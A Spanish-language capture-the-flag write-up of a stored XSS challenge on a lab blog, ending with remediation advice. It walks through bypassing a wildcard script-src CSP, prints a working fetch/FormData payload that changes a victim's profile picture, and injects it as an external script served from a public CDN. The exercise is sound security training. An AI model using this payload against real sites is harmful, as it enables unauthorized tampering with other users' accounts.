# Blog HackLab — Writeup

**Plataforma:** HackLab (SoftwareSeguro)
**Edición:** HackLab 2024
**Categoría:** XSS
**Autor:** adonaissh

## Descripción del desafío

El Blog HackLab permite a los usuarios comentar sobre el evento. Con las
credenciales `hacklab` / `hacklab2024`, el objetivo es modificar la foto de
perfil del usuario `pepe` sin tener acceso a su cuenta. El desafío ofrece
una funcionalidad para "obligar" a que Pepe visite el blog (simulación de
víctima), limitada a una vez por minuto, que no debe atacarse en sí misma.

## Reconocimiento

Al loguearse, se encuentra un blog con un comentario ya existente de
`pepe` ("Hay alguien en este blog?") y una sección de **Perfil** propia,
donde se puede editar una **Bio** (texto) y subir una **imagen de perfil**
(`profile_pic`, tipo archivo).

### Carga de imagen — inspección con DevTools

Repitiendo la subida de foto con la pestaña Network abierta, se observa:

```
POST /profile
Content-Type: multipart/form-data; boundary=...

bio=...
profile_pic=<archivo>
```

El servidor responde `200 OK` con el HTML de la página ya actualizada. La
cookie de sesión (`session=...`) es `HttpOnly` — no legible desde
JavaScript, pero irrelevante para el ataque: al ser same-origin, el
navegador la adjunta automáticamente en cualquier request hacia el mismo
dominio, sin necesidad de leerla.

## Análisis — confirmando el vector

**Primer intento (campo Bio):** se prueba `<script>alert(1)</script>` en
la Bio del perfil. Al ver el código fuente, el valor queda **escapado**
(`&lt;script&gt;...`) dentro de un `<textarea>` — no vulnerable, y además
un `<textarea>` nunca interpretaría HTML aunque no estuviera escapado.

**Segundo intento (comentarios):** se postea el mismo payload como
comentario nuevo. Viendo el código fuente de la página de comentarios:

```html
<p class="card-text"><script>alert(1)</script></p>
<p class="card-text"><img src=x onerror="alert(1)"></p>
```

Las etiquetas se guardan y renderizan **sin escapar** — confirmado
**Stored XSS** (CWE-79) en el campo de comentarios. Sin embargo, ningún
`alert()` se dispara.

### El bloqueo: Content-Security-Policy

Inspeccionando el `<head>` de la página:

```html
<meta http-equiv="Content-Security-Policy" content="script-src *">
```

Esta CSP permite cargar scripts desde **cualquier origen** (`script-src
*`), pero al no incluir `'unsafe-inline'`, **bloquea la ejecución de
JavaScript inline** — tanto `<script>...</script>` escrito directo en el
HTML como manejadores de evento inline (`onerror="..."`). Esto explica por
qué ambos payloads de prueba se insertaron en el DOM pero no ejecutaron
nada.

La consecuencia práctica: el ataque **sí es posible**, pero el JavaScript
debe cargarse desde un **archivo externo** (`<script src="...">`), no
escrito inline en el comentario.

## Explotación

### Paso 1 — payload de ataque (JS externo)

Se escribe un script que recrea la subida de foto de perfil usando
`fetch` + `FormData`, generando una imagen con un `<canvas>` (sin depender
de descargar ninguna imagen externa) para evitar problemas de red/CORS:

```javascript
(async () => {
  const canvas = document.createElement('canvas');
  canvas.width = 100;
  canvas.height = 100;
  const ctx = canvas.getContext('2d');
  ctx.fillStyle = 'red';
  ctx.fillRect(0, 0, 100, 100);

  canvas.toBlob(async (blob) => {
    const fd = new FormData();
    fd.append('profile_pic', blob, 'pwned.png');
    fd.append('bio', 'pwned by XSS');
    await fetch('/profile', { method: 'POST', body: fd });
  }, 'image/png');
})();
```

### Paso 2 — hosteo del script externo

El archivo `payload.js` se sube a un repositorio público de GitHub y se
sirve a través de **jsDelivr** (CDN que entrega archivos de GitHub con el
`Content-Type` correcto para ejecutarse como script):

```
https://cdn.jsdelivr.net/gh/Adonai1027/xss-payloads@main/payload.js
```

### Paso 3 — inyección en un comentario

```html
<script src="https://cdn.jsdelivr.net/gh/Adonai1027/xss-payloads@main/payload.js"></script>
```

### Paso 4 — verificación en la propia cuenta

Antes de atacar a Pepe, se recarga la página logueado como `hacklab`: la
Bio cambia a "pwned by XSS" y la foto de perfil pasa a ser el cuadrado
rojo generado por canvas — confirmando que:
1. El script externo se carga y ejecuta pese a la CSP.
2. El `POST /profile` funciona autenticado solo con la cookie de sesión
   del navegador (same-origin), sin necesidad de leerla ni robarla.

### Paso 5 — ataque real sobre Pepe

Se usa la funcionalidad del desafío para forzar la visita de Pepe,
pegando el dominio de la instancia (protocolo + dominio, sin path) en el
campo correspondiente. Al cargar el blog, el navegador de Pepe ejecuta el
comentario malicioso con su propia sesión activa, disparando el mismo
`POST /profile` pero esta vez modificando **su** perfil.

### Resultado

Al recargar el blog como `hacklab`, se observa la flag:

**Flag:** `44301e6c871eb9e21cfd16fd94e4fe90`

## Causa raíz y remediación

- **Causa raíz:** el campo de comentarios no sanea ni escapa el HTML
  ingresado por el usuario antes de almacenarlo y renderizarlo para otros
  usuarios — **Stored Cross-Site Scripting (CWE-79)**. La Content-Security-
  Policy presente (`script-src *`) mitiga parcialmente el impacto (bloquea
  scripts inline) pero, al permitir scripts desde cualquier origen externo,
  no impide la explotación — solo la vuelve un paso más elaborada.

- **Remediación recomendada:**
  1. **Escapar/sanear todo contenido generado por el usuario** antes de
     insertarlo en el HTML de la página (usar el auto-escape del motor de
     templates, p. ej. Jinja2 con `autoescape` activado, o una librería de
     sanitización como DOMPurify si se necesita permitir HTML limitado).
  2. **Endurecer la CSP**: restringir `script-src` a los orígenes
     explícitamente necesarios (el propio dominio y, si hacen falta, CDNs
     puntuales como `cdn.jsdelivr.net` o `code.jquery.com`), en vez de
     `*`. Un wildcard en `script-src` neutraliza buena parte del valor de
     tener CSP, ya que permite cargar JavaScript desde cualquier origen
     controlado por un atacante.
  3. Marcar la cookie de sesión también con **`SameSite=Strict`** (o al
     menos `Lax`) además de `HttpOnly`, para reducir el abuso de acciones
     autenticadas disparadas por contenido malicioso.
  4. Validar y limitar también qué se puede subir como `profile_pic` desde
     el propio formulario legítimo (tipo de archivo, tamaño), ya que es el
     endpoint finalmente abusado por el ataque.

## Herramientas usadas

- DevTools del navegador (inspección de requests, Network, código fuente)
- GitHub + jsDelivr (hosteo del payload JavaScript externo)

## Reconocimientos

Desafío y solución de referencia originales por el equipo **M1st1fy**
(Tomás N. Raspa y Agustín M. Blanco, UTN FRBA) para HackLab 2024. Esta
resolución llegó al mismo resultado por un camino equivalente (uso de
`fetch`/`FormData` + `canvas` en vez de `jQuery.ajax` + imagen externa
descargada, y jsDelivr en vez de ngrok para servir el script).